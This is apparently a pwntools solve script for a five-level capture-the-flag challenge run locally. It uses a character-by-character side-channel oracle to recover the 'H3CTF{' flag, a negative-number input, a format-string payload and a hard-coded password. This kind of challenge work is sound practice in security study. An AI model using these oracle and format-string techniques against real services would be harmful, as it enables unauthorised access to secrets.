from pwn import *
import string

context.log_level = "error"


def solve_1(io):
  io.recvuntil(b"Choose a level to escape > ")
  io.sendline(b"1")
  io.sendline()
  print(io.recvline())


def solve_2(io):
  io.recvuntil(b"Choose a level to escape > ")
  io.sendline(b"2")
  io.sendline(b"-1")
  print(io.recvuntil(b"}\n"))


def solve_3(io):
  charset = string.ascii_letters + string.digits + "_{}"
  prefix = "H3CTF{"

  def measure(s):
    io.sendlineafter(b"Wondering the time? ", s.encode())
    line = io.recvline().strip().decode()
    m = eval(line)
    return m

  while True:
    best_c, best_score = None, None
    for ch, count in zip(charset, range(len(charset))):
      io.recvuntil(b"Choose a level to escape > ")
      io.sendline(b"3")
      score = measure(prefix + ch)
      if count == 0:
        best_score, best_c = score, ch
      if score < best_score:
        best_score, best_c = score, ch

    prefix += best_c

    print(f"[+] current prefix: {prefix!r}")
    if best_c == "}":
      break

  return prefix


def solve_4(io):
  io.recvuntil(b"Choose a level to escape > ")
  io.sendline(b"4")
  payload = "{0:1}"
  io.sendline(payload.encode())
  print(io.recvline())

def solve_5(io):
  io.recvuntil(b"Choose a level to escape > ")
  io.sendline(b"5")
  b = "Swizzer!!"
  io.sendline(b.encode())
  print(io.recvline())

if __name__ == "__main__":
  io = process(["python3", "chall.py"])
  solve_1(io)
  solve_2(io)
  flag3 = solve_3(io)
  print(f"{flag3}")
  solve_4(io)
  io.close()